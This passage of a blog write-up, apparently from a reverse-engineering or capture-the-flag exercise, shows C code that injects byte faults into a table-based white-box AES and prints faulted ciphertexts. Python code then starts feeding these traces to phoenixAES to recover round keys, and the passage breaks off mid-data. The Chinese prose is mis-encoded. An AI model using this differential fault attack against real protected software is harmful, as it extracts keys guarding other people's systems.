</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>gmul</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>gmul</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>gmul</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>gmul</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>3</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>gmul</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>3</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>3</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span><span class=p>[</span><span class=mi>3</span><span class=p>][</span><span class=n>i</span><span class=p>][</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>gmul</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>getTyiBox</span><span class=p>(</span><span class=n>u8</span> <span class=n>tbox</span><span class=p>[</span><span class=mi>10</span><span class=p>][</span><span class=mi>16</span><span class=p>][</span><span class=mi>256</span><span class=p>],</span> <span class=n>u32</span> <span class=n>tyibox</span><span class=p>[</span><span class=mi>9</span><span class=p>][</span><span class=mi>16</span><span class=p>][</span><span class=mi>256</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>u8</span> <span class=n>tyitable</span><span class=p>[</span><span class=mi>4</span><span class=p>][</span><span class=mi>256</span><span class=p>][</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=n>getTyiTable</span><span class=p>(</span><span class=n>tyitable</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>r</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>r</span> <span class=o>&lt;</span> <span class=mi>9</span><span class=p>;</span> <span class=n>r</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>x</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>x</span> <span class=o>&lt;</span> <span class=mi>256</span><span class=p>;</span> <span class=n>x</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>u32</span> <span class=n>v0</span> <span class=o>=</span> <span class=n>tyitable</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=n>tbox</span><span class=p>[</span><span class=n>r</span><span class=p>][</span><span class=n>j</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>i</span><span class=p>][</span><span class=n>x</span><span class=p>]][</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>          <span class=n>u32</span> <span class=n>v1</span> <span class=o>=</span> <span class=n>tyitable</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=n>tbox</span><span class=p>[</span><span class=n>r</span><span class=p>][</span><span class=n>j</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>i</span><span class=p>][</span><span class=n>x</span><span class=p>]][</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>          <span class=n>u32</span> <span class=n>v2</span> <span class=o>=</span> <span class=n>tyitable</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=n>tbox</span><span class=p>[</span><span class=n>r</span><span class=p>][</span><span class=n>j</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>i</span><span class=p>][</span><span class=n>x</span><span class=p>]][</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>          <span class=n>u32</span> <span class=n>v3</span> <span class=o>=</span> <span class=n>tyitable</span><span class=p>[</span><span class=mi>3</span><span class=p>][</span><span class=n>tbox</span><span class=p>[</span><span class=n>r</span><span class=p>][</span><span class=n>j</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>i</span><span class=p>][</span><span class=n>x</span><span class=p>]][</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>          <span class=n>tyibox</span><span class=p>[</span><span class=n>r</span><span class=p>][</span><span class=n>j</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>i</span><span class=p>][</span><span class=n>x</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>v0</span> <span class=o>&lt;&lt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>v1</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>v2</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=n>v3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>u32</span> <span class=n>tyibox</span><span class=p>[</span><span class=mi>10</span><span class=p>][</span><span class=mi>16</span><span class=p>][</span><span class=mi>256</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=o>...</span><span class=p>};</span>    <span class=o>//</span><span class=n>å¤ªé•¿ç•¥å»</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>u8</span> <span class=n>tbox</span><span class=p>[</span><span class=mi>16</span><span class=p>][</span><span class=mi>256</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=o>...</span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>index</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>aes_encrypt_by_table</span><span class=p>(</span><span class=n>u8</span> <span class=nb>input</span><span class=p>[</span><span class=mi>16</span><span class=p>],</span> <span class=nb>int</span> <span class=n>isDFA</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>u32</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>c</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=n>aa</span><span class=p>,</span> <span class=n>bb</span><span class=p>,</span> <span class=n>cc</span><span class=p>,</span> <span class=n>dd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>u8</span> <span class=n>xortable</span><span class=p>[</span><span class=mi>16</span><span class=p>][</span><span class=mi>16</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>getXorTable</span><span class=p>(</span><span class=n>xortable</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>9</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>isDFA</span> <span class=o>&amp;&amp;</span> <span class=n>i</span> <span class=o>==</span> <span class=mi>8</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>srand</span><span class=p>(</span><span class=n>index</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nb>input</span><span class=p>[</span><span class=n>index</span><span class=p>]</span> <span class=o>=</span> <span class=n>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mi>256</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>shiftRows</span><span class=p>(</span><span class=nb>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>a</span> <span class=o>=</span> <span class=n>tyibox</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>0</span><span class=p>][</span><span class=nb>input</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>0</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>      <span class=n>b</span> <span class=o>=</span> <span class=n>tyibox</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>1</span><span class=p>][</span><span class=nb>input</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>      <span class=n>c</span> <span class=o>=</span> <span class=n>tyibox</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>2</span><span class=p>][</span><span class=nb>input</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>      <span class=n>d</span> <span class=o>=</span> <span class=n>tyibox</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>3</span><span class=p>][</span><span class=nb>input</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>3</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>      <span class=n>aa</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[(</span><span class=n>a</span> <span class=o>&gt;&gt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][(</span><span class=n>b</span> <span class=o>&gt;&gt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>bb</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[(</span><span class=n>c</span> <span class=o>&gt;&gt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][(</span><span class=n>d</span> <span class=o>&gt;&gt;</span> <span class=mi>28</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>cc</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[(</span><span class=n>a</span> <span class=o>&gt;&gt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][(</span><span class=n>b</span> <span class=o>&gt;&gt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>dd</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[(</span><span class=n>c</span> <span class=o>&gt;&gt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][(</span><span class=n>d</span> <span class=o>&gt;&gt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=nb>input</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=p>((</span><span class=n>aa</span> <span class=o>^</span> <span class=n>bb</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>cc</span> <span class=o>^</span> <span class=n>dd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>aa</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[(</span><span class=n>a</span> <span class=o>&gt;&gt;</span> <span class=mi>20</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][(</span><span class=n>b</span> <span class=o>&gt;&gt;</span> <span class=mi>20</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>bb</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[(</span><span class=n>c</span> <span class=o>&gt;&gt;</span> <span class=mi>20</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][(</span><span class=n>d</span> <span class=o>&gt;&gt;</span> <span class=mi>20</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>cc</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[(</span><span class=n>a</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][(</span><span class=n>b</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>dd</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[(</span><span class=n>c</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][(</span><span class=n>d</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=nb>input</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>((</span><span class=n>aa</span> <span class=o>^</span> <span class=n>bb</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>cc</span> <span class=o>^</span> <span class=n>dd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>aa</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[(</span><span class=n>a</span> <span class=o>&gt;&gt;</span> <span class=mi>12</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][(</span><span class=n>b</span> <span class=o>&gt;&gt;</span> <span class=mi>12</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>bb</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[(</span><span class=n>c</span> <span class=o>&gt;&gt;</span> <span class=mi>12</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][(</span><span class=n>d</span> <span class=o>&gt;&gt;</span> <span class=mi>12</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>cc</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[(</span><span class=n>a</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][(</span><span class=n>b</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>dd</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[(</span><span class=n>c</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][(</span><span class=n>d</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=nb>input</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>((</span><span class=n>aa</span> <span class=o>^</span> <span class=n>bb</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>cc</span> <span class=o>^</span> <span class=n>dd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>aa</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[(</span><span class=n>a</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][(</span><span class=n>b</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>bb</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[(</span><span class=n>c</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][(</span><span class=n>d</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>cc</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[</span><span class=n>a</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][</span><span class=n>b</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=n>dd</span> <span class=o>=</span> <span class=n>xortable</span><span class=p>[</span><span class=n>c</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>][</span><span class=n>d</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=nb>input</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>((</span><span class=n>aa</span> <span class=o>^</span> <span class=n>bb</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>cc</span> <span class=o>^</span> <span class=n>dd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>shiftRows</span><span class=p>(</span><span class=nb>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>input</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>tbox</span><span class=p>[</span><span class=n>j</span><span class=p>][</span><span class=nb>input</span><span class=p>[</span><span class=n>j</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>unsigned</span> <span class=n>char</span> <span class=n>input1</span><span class=p>[</span><span class=mi>17</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=n>aes_encrypt_by_table</span><span class=p>(</span><span class=n>input1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span> <span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span> <span class=p>;</span> <span class=n>i</span> <span class=o>++</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02x</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>input1</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>puts</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span> <span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>16</span> <span class=p>;</span> <span class=n>j</span> <span class=o>++</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>unsigned</span> <span class=n>char</span> <span class=nb>input</span><span class=p>[</span><span class=mi>17</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>aes_encrypt_by_table</span><span class=p>(</span><span class=nb>input</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nb>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span> <span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span> <span class=p>;</span> <span class=n>i</span> <span class=o>++</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02x</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>input</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>index</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°æ•…éšœæ•°æ®ï¼Œç”¨phoneixAESç”Ÿæˆè½®å¯†é’¥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>phoenixAES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;tracefile&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>t</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>db997e69af7daf43bfadaa94bc68bbef
</span></span></span><span class=line><span class=cl><span class=s2>9b997e69af7daf52bfad4494bc64bbef
